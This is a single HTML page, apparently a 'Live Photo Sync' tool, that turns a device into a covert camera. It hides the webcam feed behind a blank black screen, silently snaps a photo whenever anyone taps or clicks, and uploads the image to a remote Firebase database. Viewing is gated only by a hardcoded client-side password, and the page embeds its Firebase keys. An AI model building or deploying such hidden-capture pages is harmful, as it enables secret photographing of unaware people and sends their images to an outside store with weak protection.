<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Live Photo Sync - Secure 4 Photos</title>
  <style>
    body {
      background: black;
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      overflow-y: scroll;
      min-height: 100vh;
    }
    #captureArea {
      height: 100vh;
      width: 100vw;
    }
    #result {
      text-align: center;
      padding: 20px;
      color: white;
    }
    #unlockBtn {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #222;
      color: #0f0;
      border: none;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      font-size: 25px;
      cursor: pointer;
      display: none;
      z-index: 9999;
    }
    .photoGrid {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
      margin-top: 40px;
      scroll-margin-top: 100px;
    }
    .photoGrid img {
      width: 45%;
      max-width: 180px;
      border: 2px solid white;
      display: none;
    }
  </style>
</head>
<body>
  <div id="captureArea" ontouchstart="capture()" onclick="capture()"></div>

  <!-- Removed spacer -->

  <div id="result">
    <h3>Captured Photos:</h3>
    <button id="unlockBtn">ðŸ”’</button>
    <div class="photoGrid" id="photoGrid"></div>
  </div>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyByYx-ScUywHwz_YK_ZV7rDREBTScrWWKs",
      authDomain: "livesnap-d57c2.firebaseapp.com",
      databaseURL: "https://livesnap-d57c2-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "livesnap-d57c2",
      storageBucket: "livesnap-d57c2.firebasestorage.app",
      messagingSenderId: "24202813286",
      appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
      measurementId: "G-BR9MFH2XN6"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const photoGrid = document.getElementById('photoGrid');
    const unlockBtn = document.getElementById('unlockBtn');

    let isUnlocked = false;

    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      video.srcObject = stream;
    });

    function capture() {
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL("image/jpeg");

      db.ref("livephotos").once("value", snapshot => {
        let photos = snapshot.val() || [];
        if (photos.length >= 4) photos.shift();
        photos.push(dataUrl);
        db.ref("livephotos").set(photos);
      });
    }

    db.ref("livephotos").on("value", snapshot => {
      const photos = snapshot.val() || [];
      photoGrid.innerHTML = "";
      photos.forEach(url => {
        const img = document.createElement("img");
        img.src = url;
        img.style.display = isUnlocked ? "block" : "none";
        photoGrid.appendChild(img);
      });

      if (photos.length > 0 && !isUnlocked) {
        unlockBtn.style.display = "inline-block";
      }
    });

    unlockBtn.addEventListener("click", () => {
      const pass = prompt("Enter password to unlock photos:");
      if (pass === "hamza") {
        isUnlocked = true;
        unlockBtn.style.display = "none";

        document.querySelectorAll(".photoGrid img").forEach(img => {
          img.style.display = "block";
        });

        photoGrid.scrollIntoView({ behavior: "smooth" });
      } else {
        alert("Wrong password!");
      }
    });
  </script>
</body>
</html>
